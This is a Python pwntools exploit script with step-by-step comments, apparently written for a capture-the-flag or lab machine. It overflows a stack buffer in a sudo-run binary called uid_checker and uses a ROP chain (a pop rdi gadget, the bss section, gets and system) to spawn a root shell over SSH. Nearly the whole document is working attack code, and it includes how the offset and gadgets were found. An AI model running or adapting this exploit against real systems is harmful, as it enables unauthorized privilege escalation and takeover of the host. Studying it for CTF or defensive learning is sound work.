from pwn import *

#As an initial note, my reccomendation would be to do all of this within gdb. 
#I reccoment you download the GEF Extention which you can download here
#https://github.com/hugsy/gef

#To Begin lets define our needed variables
#to find our padding, use msf-pattern_create and msf_pattern_offset
#for create the -l flag speficies the length, start the program in gdb and give
#the pattern as input
#after giving the patter as input we see the current value on the stack pointer
#c9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5
#using msf-pattern_offset -q c9Ad (the first 4 bytes) gives us our padding
#and that command returns at 88
#the reason we are taking the value of RSP is because our Instruction Pointer (RIP)
#shows us this: $rip   : 0x000000000040079d  â†’  <main+215> ret 
#it has a return, this means the value will go on top of the stack pointer
#padding needed to overwrite
offset = 88


#so whats our game plan going foward?
#we need to find a ROP Gadget. So what is a rop gadget then? 
#ROP Gadets are small instruction sequences ending with a "ret" (return)
#Combining these gadgets will let us preform more complicated instructions. 
#lets locate some of these
#so using the tool ROPPER, we can use the command
#ropper -s cmd to locate ROP GADGETS 
#looking at the output of it, we see the gadget
#0x0000000000400803: pop rdi; ret;  
#we can use this.
gadget = 0x400803


#In computer programming, the name .bss or bss is used by many compilers and linkers
#for the portion of an object file
#or executable containing statically-allocated variables that are not
#explicitly initialized to any value.
#It is often referred to as the "bss section" or "bss segment"
#    0x0008:         0x601060 [arg0] rdi = 6295648
bss = 0x601060


#Opening our binary in gdb and running the command "disas gets"
#On the first line we see:
#   0x00000000004005b0 <+0>:	jmp    QWORD PTR [rip+0x200a92]        # 0x601048 <gets@got.plt>
#The first memory addr being the needed one for our gets variable
gets = 0x4005b0


#Opening our binary in gdb and running the command "info functions"
#We see 0x0000000000400570  system@plt
#this is the memory addr for the system function
system = 0x400570


#Now that we have our needed variables defined
#We can start building our rop chain
payload = cyclic(offset)
payload += p64(gadget)
payload += p64(bss) 
payload += p64(gets) 
payload += p64(gadget)
payload += p64(bss)
payload += p64(system)


#There are two methods of running this exploit.
#Option One Being locally, to exploit the binary on your own machin
#replace with the name of your binary


#Remote update, get a SSH key by generatating it from Daves user
s = ssh(host='IP OF MACHINE', user='dave', keyfile='./example')

p = s.process(['sudo', '/uid_checker'])

print(p.recv())

p.sendline(payload)

print(p.recv())

p.sendline("/bin/sh")

p.interactive(prompt='')
